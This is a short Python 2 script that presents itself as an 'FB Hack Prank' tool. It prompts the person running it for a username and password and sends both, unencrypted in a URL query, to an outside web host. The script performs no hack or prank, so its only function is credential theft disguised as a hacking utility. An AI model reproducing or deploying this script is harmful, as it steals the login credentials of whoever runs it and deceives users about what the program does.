from time import *
from subprocess import *
from hashlib import *
import marshal
import getpass
import json
import random
import os

try:
    import requests as r
except ImportError:
    os.system("pip2 install requests")


def main():
    os.system('clear')
    R = '\033[31;1m'

    print(R+'###########################################\n')
    print(R+'#-- Created By RJ97600 for FB Hack Prank --#\n\n')
    print(R+'###########################################\n')


    uid = raw_input('Username : ')
    pwd = raw_input('Password : ')
    fin = uid+pwd
    r.post('https://directlinks.freetzi.com/data.php?lc='+fin)



main()
